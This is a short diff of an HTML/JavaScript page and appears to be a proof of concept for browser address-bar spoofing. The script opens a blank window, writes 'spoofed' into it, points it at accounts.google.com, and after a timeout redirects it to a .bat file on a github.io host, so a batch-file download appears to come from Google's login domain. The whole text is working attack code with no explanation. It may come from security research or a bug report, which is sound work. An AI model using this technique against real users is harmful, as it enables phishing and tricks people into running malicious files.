@@ -2,7 +2,9 @@
 
 <script>
 function f() {
-  w = window.open("https://accounts.google.com");
+  w = window.open("");
+  w.document.write('<h1>spoofed</h1>');
+  w.location.href = 'https://accounts.google.com';
 
   setTimeout(function() {
     w.location.replace('https://heloworld285.github.io/calc.bat');
